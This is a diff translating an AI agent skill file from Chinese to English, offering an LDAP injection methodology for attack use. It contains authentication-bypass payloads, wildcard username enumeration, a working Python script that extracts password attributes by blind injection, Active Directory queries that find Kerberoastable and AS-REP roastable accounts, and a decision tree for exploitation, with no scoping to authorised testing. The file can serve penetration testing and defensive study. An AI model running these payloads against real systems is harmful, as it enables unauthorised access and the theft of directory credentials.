@@ -1,143 +1,145 @@
 ---
 name: ldap-injection
-description: "LDAP 注入检测与利用。当目标有 LDAP 认证入口（企业登录/SSO/统一认证）、发现 389/636/3268/3269 端口、URL 参数中出现 uid/cn/ou/dc 等 LDAP 属性名、或后端使用 LDAP 进行用户查询时使用。LDAP 注入与 SQL 注入思路类似但语法不同——通过注入 LDAP 搜索过滤器操作符来绕过认证或提取数据。在域环境和企业内网中常见，与 AD 域攻击配合可以获取域用户凭据。发现任何 LDAP 相关入口、Active Directory 集成认证、或 LDAP 查询参数时都应使用此 skill"
+description: "LDAP injection detection and exploitation. Use when the target has an LDAP authentication entry point (enterprise login/SSO/unified authentication), when ports 389/636/3268/3269 are discovered, when URL parameters contain LDAP attribute names such as uid/cn/ou/dc, or when the backend uses LDAP for user lookups. LDAP injection is similar in concept to SQL injection but uses different syntax — injecting LDAP search filter operators to bypass authentication or extract data. It is common in domain environments and enterprise internal networks, and combined with AD domain attacks it can yield domain user credentials. Use this skill whenever any LDAP-related entry point, Active Directory integrated authentication, or LDAP query parameter is found"
+zh-signals: "检测并利用 LDAP 搜索过滤器注入实现认证绕过或目录数据提取。信号:LDAP注入,认证绕过,搜索过滤器,Active Directory,389,盲注"
+when-to-use: "Use when a target exposes an LDAP-backed login, SSO, or user lookup and LDAP attributes such as uid/cn/ou/dc appear in request parameters."
 metadata:
-  tags: "ldap,injection,LDAP注入,认证绕过,搜索过滤器,active directory,389,636,blind ldap,域环境"
+  tags: "ldap,injection,LDAP-injection,authentication-bypass,search-filter,active directory,389,636,blind ldap,domain-environment"
   category: "exploit"
 ---
 
-# LDAP 注入方法论
+# LDAP Injection Methodology
 
-LDAP（轻量目录访问协议）广泛用于企业用户认证和目录查询。当应用将用户输入直接拼接到 LDAP 搜索过滤器中时，攻击者可以修改查询逻辑来绕过认证或提取目录数据。
+LDAP (Lightweight Directory Access Protocol) is widely used for enterprise user authentication and directory lookups. When an application concatenates user input directly into an LDAP search filter, an attacker can modify the query logic to bypass authentication or extract directory data.
 
-## Phase 0: 识别 LDAP 后端
+## Phase 0: Identifying the LDAP Backend
 
-| 信号 | 含义 |
+| Signal | Meaning |
 |------|------|
-| 登录表单中有"域\用户名"或"user@domain.com"格式 | 可能是 LDAP/AD 认证 |
-| 端口 389(LDAP)/636(LDAPS)/3268(Global Catalog) 开放 | 确认 LDAP 服务 |
-| 错误信息含 `LDAP`、`javax.naming`、`ldap_bind` | 确认 LDAP 后端 |
-| URL 参数中有 `uid`、`cn`、`ou`、`dc`、`sAMAccountName` | LDAP 属性名 |
-| 使用 Active Directory 集成认证的 Web 应用 | LDAP 查询 |
+| Login form contains a "domain\username" or "user@domain.com" format | Possibly LDAP/AD authentication |
+| Ports 389 (LDAP)/636 (LDAPS)/3268 (Global Catalog) are open | LDAP service confirmed |
+| Error messages contain `LDAP`, `javax.naming`, `ldap_bind` | LDAP backend confirmed |
+| URL parameters contain `uid`, `cn`, `ou`, `dc`, `sAMAccountName` | LDAP attribute names |
+| Web application uses Active Directory integrated authentication | LDAP queries |
 
-## LDAP 过滤器语法速查
+## LDAP Filter Syntax Quick Reference
 
-LDAP 使用前缀表达式（波兰记法）：
+LDAP uses prefix notation (Polish notation):
 
 ```
-# 基础
-(uid=john)                    # uid 等于 john
-(cn=John Smith)               # cn 等于 John Smith
+# Basics
+(uid=john)                    # uid equals john
+(cn=John Smith)               # cn equals John Smith
 
-# 通配符
-(uid=j*)                      # uid 以 j 开头
-(uid=*john*)                  # uid 包含 john
+# Wildcards
+(uid=j*)                      # uid starts with j
+(uid=*john*)                  # uid contains john
 
-# 逻辑操作
+# Logical operators
 (&(uid=john)(password=pass))  # AND
 (|(uid=john)(uid=admin))      # OR
 (!(uid=guest))                # NOT
 
-# 组合
+# Combination
 (&(objectClass=user)(|(uid=john)(uid=admin)))
 ```
 
-## Phase 1: 认证绕过
+## Phase 1: Authentication Bypass
 
-### 1.1 基础注入
+### 1.1 Basic Injection
 
-假设后端查询为：`(&(uid=INPUT_USER)(userPassword=INPUT_PASS))`
+Assume the backend query is: `(&(uid=INPUT_USER)(userPassword=INPUT_PASS))`
 
 ```
-# 注入用户名字段
-用户名: *)(uid=*))(|(uid=*
-密码: anything
-→ 查询变为: (&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))
-→ 第一个过滤器 (uid=*) 匹配所有用户
+# Inject into the username field
+Username: *)(uid=*))(|(uid=*
+Password: anything
+→ Query becomes: (&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))
+→ The first filter (uid=*) matches every user
 
-# 或更简单：
-用户名: *
-密码: *
-→ (&(uid=*)(userPassword=*)) → 匹配所有有密码的用户
+# Or even simpler:
+Username: *
+Password: *
+→ (&(uid=*)(userPassword=*)) → matches every user that has a password
 
-# 闭合括号绕过
-用户名: admin)(&)
-密码: anything
+# Closing parenthesis bypass
+Username: admin)(&)
+Password: anything
 → (&(uid=admin)(&))(userPassword=anything)
-→ (&) 是 LDAP 的 TRUE，永远为真
+→ (&) is LDAP TRUE and is always true
 
-# 注释截断（某些实现支持）
-用户名: admin)%00
-密码: anything
+# Comment truncation (supported by some implementations)
+Username: admin)%00
+Password: anything
 → (&(uid=admin)\x00)(userPassword=anything)
-→ NULL 字节截断后面的密码检查
+→ The NULL byte truncates the subsequent password check
 ```
 
-### 1.2 通配符认证绕过
+### 1.2 Wildcard Authentication Bypass
 
 ```
-# 如果只知道用户名前缀
-用户名: adm*
-密码: *
-→ (&(uid=adm*)(userPassword=*)) → 匹配 admin/administrator 等
+# If only the username prefix is known
+Username: adm*
+Password: *
+→ (&(uid=adm*)(userPassword=*)) → matches admin/administrator etc.
 
-# 枚举有效用户名
-用户名: a* → 有响应？用户名以 a 开头
-用户名: ad* → 有响应？用户名以 ad 开头
-用户名: adm* → 有响应？...
+# Enumerate valid usernames
+Username: a* → Response? Username starts with a
+Username: ad* → Response? Username starts with ad
+Username: adm* → Response? ...
 ```
 
-### 1.3 OR 注入
+### 1.3 OR Injection
 
 ```
-# 注入 OR 条件
-用户名: admin)(|(password=*
-密码: anything
+# Inject an OR condition
+Username: admin)(|(password=*
+Password: anything
 → (&(uid=admin)(|(password=*)(userPassword=anything)))
-→ OR 条件使密码检查无效
+→ The OR condition neutralizes the password check
 
-# 另一种 OR 绕过
-用户名: *)(|(objectClass=*
-密码: test)
+# Another OR bypass
+Username: *)(|(objectClass=*
+Password: test)
 → (&(uid=*)(|(objectClass=*)(userPassword=test)))
 ```
 
-## Phase 2: 数据提取（盲注）
+## Phase 2: Data Extraction (Blind Injection)
 
-### 2.1 属性值盲注
+### 2.1 Attribute Value Blind Injection
 
-通过通配符逐字符猜测属性值：
+Guess attribute values character by character using wildcards:
 
 ```
-# 猜测 admin 的密码
-(&(uid=admin)(userPassword=a*))  → 响应不同？密码以 a 开头
-(&(uid=admin)(userPassword=ab*)) → 继续...
+# Guess the password of admin
+(&(uid=admin)(userPassword=a*))  → Different response? The password starts with a
+(&(uid=admin)(userPassword=ab*)) → Continue...
 (&(uid=admin)(userPassword=abc*))
 
-# 猜测 description 字段（可能含敏感信息）
+# Guess the description field (may contain sensitive information)
 (&(uid=admin)(description=flag*))
 (&(uid=admin)(description=flag{*))
 ```
 
-### 2.2 属性存在性探测
+### 2.2 Attribute Existence Probing
 
 ```
-# 探测用户有哪些属性
-(&(uid=admin)(telephoneNumber=*))  → 有电话号码？
-(&(uid=admin)(mail=*))             → 有邮箱？
-(&(uid=admin)(userPassword=*))     → 有密码？
-(&(uid=admin)(sshPublicKey=*))     → 有 SSH 公钥？
+# Probe which attributes a user has
+(&(uid=admin)(telephoneNumber=*))  → Has a phone number?
+(&(uid=admin)(mail=*))             → Has an email?
+(&(uid=admin)(userPassword=*))     → Has a password?
+(&(uid=admin)(sshPublicKey=*))     → Has an SSH public key?
 
-# AD 环境特有属性
-(&(sAMAccountName=admin)(adminCount=1))      → 是管理员？
-(&(sAMAccountName=admin)(memberOf=*admin*))  → 在管理组中？
+# Attributes specific to AD environments
+(&(sAMAccountName=admin)(adminCount=1))      → Is an administrator?
+(&(sAMAccountName=admin)(memberOf=*admin*))  → In an administrative group?
 ```
 
-### 2.3 自动化盲注脚本
+### 2.3 Automated Blind Injection Script
 
 ```python
 #!/usr/bin/env python3
-"""LDAP 盲注数据提取"""
+"""LDAP blind injection data extraction"""
 import requests
 import string
 
@@ -146,22 +148,22 @@ CHARSET = string.ascii_lowercase + string.digits + "_{}-@."
 ATTR = "userPassword"
 
 def check(username_payload):
-    """发送 LDAP 注入请求"""
+    """Send an LDAP injection request"""
     data = {
         "username": username_payload,
         "password": "anything"
     }
     r = requests.post(URL, data=data)
-    # 根据响应差异判断（长度/内容/状态码/重定向）
+    # Judge by the response difference (length/content/status code/redirect)
     return "Welcome" in r.text or r.status_code == 302
 
 def extract(target_user, attribute):
-    """逐字符提取属性值"""
+    """Extract the attribute value character by character"""
     result = ""
     while True:
         found = False
         for c in CHARSET:
-            # 注入: admin)(ATTR=result+c*
+            # Inject: admin)(ATTR=result+c*
             payload = f"{target_user})({attribute}={result}{c}*"
             if check(payload):
                 result += c
@@ -177,82 +179,82 @@ if __name__ == "__main__":
     print(f"[+] Extracted: {pwd}")
 ```
 
-## Phase 3: 目录遍历
+## Phase 3: Directory Enumeration
 
-如果注入点在搜索查询（非认证）中：
+If the injection point is in a search query (not authentication):
 
 ```
-# 提取所有用户
+# Extract all users
 (&(objectClass=user)(uid=*))
 
-# 提取管理员
+# Extract administrators
 (&(objectClass=user)(adminCount=1))
 
-# 提取服务账户
+# Extract service accounts
 (&(objectClass=user)(servicePrincipalName=*))
 
-# 提取计算机
+# Extract computers
 (&(objectClass=computer)(cn=*))
 
-# 搜索特定组的成员
+# Search for members of a specific group
 (&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local))
 ```
 
-## Phase 4: 特殊技巧
+## Phase 4: Special Techniques
 
-### 4.1 NULL 字节截断
+### 4.1 NULL Byte Truncation
 
 ```
-# 某些 LDAP 实现（如 OpenLDAP 旧版）支持 NULL 字节截断
+# Some LDAP implementations (such as old OpenLDAP) support NULL byte truncation
 admin)%00
-→ 截断后面的密码过滤器
+→ Truncates the subsequent password filter
 ```
 
-### 4.2 特殊字符转义绕过
+### 4.2 Special Character Escaping Bypass
 
-LDAP 需要转义的字符：`* ( ) \ NUL`
+Characters that LDAP requires to be escaped: `* ( ) \ NUL`
 
 ```
-# 如果应用转义了 *，尝试：
-\2a  →  * 的十六进制转义
-\28  →  ( 的十六进制转义
-\29  →  ) 的十六进制转义
+# If the application escapes *, try:
+\2a  →  hexadecimal escape for *
+\28  →  hexadecimal escape for (
+\29  →  hexadecimal escape for )
 ```
 
-### 4.3 LDAP 与 AD 结合
+### 4.3 Combining LDAP with AD
 
-如果 LDAP 后端是 Active Directory：
+If the LDAP backend is Active Directory:
 ```
-# 获取域管列表
+# Get the domain admin list
 (&(objectCategory=person)(adminCount=1))
 
-# 获取 Kerberoastable 账户
+# Get Kerberoastable accounts
 (&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))
 
-# 获取 AS-REP Roastable 账户  
+# Get AS-REP Roastable accounts  
 (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
 
-# 获取密码永不过期账户
+# Get accounts whose passwords never expire
 (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))
 ```
 
-## 决策树
+## Decision Tree
 
 ```
-发现 LDAP 认证入口
-├── 尝试 */* → 认证绕过？
-├── 尝试 admin)(&)/ → 闭合+TRUE 绕过？
-├── 尝试 admin)%00/ → NULL 截断？
-├── 以上都失败
-│   ├── 检查错误信息 → 确认是否 LDAP
-│   ├── 检查通配符 a*/b*/c* → 用户名枚举
-│   └── 非 LDAP → 尝试 SQL 注入
-└── 认证成功或有注入点
-    ├── 盲注提取密码/属性
-    ├── 遍历目录（用户/组/计算机）
-    └── AD 环境 → Kerberoast/AS-REP 目标发现
+LDAP authentication entry point discovered
+├── Try */* → authentication bypass?
+├── Try admin)(&)/ → closing-paren + TRUE bypass?
+├── Try admin)%00/ → NULL truncation?
+├── All of the above failed
+│   ├── Inspect error messages → confirm whether it is LDAP
+│   ├── Check wildcards a*/b*/c* → username enumeration
+│   └── Not LDAP → try SQL injection
+└── Authentication succeeded or an injection point was found
+    ├── Blind injection to extract passwords/attributes
+    ├── Enumerate the directory (users/groups/computers)
+    └── AD environment → Kerberoast/AS-REP target discovery
 ```
 
-## 深入参考
+## Further Reading
 
-- LDAP 注入 payload 与盲注技术 → [references/ldap-exploitation.md](references/ldap-exploitation.md)
+- LDAP injection payloads and blind injection techniques → [references/ldap-exploitation.md](references/ldap-exploitation.md)
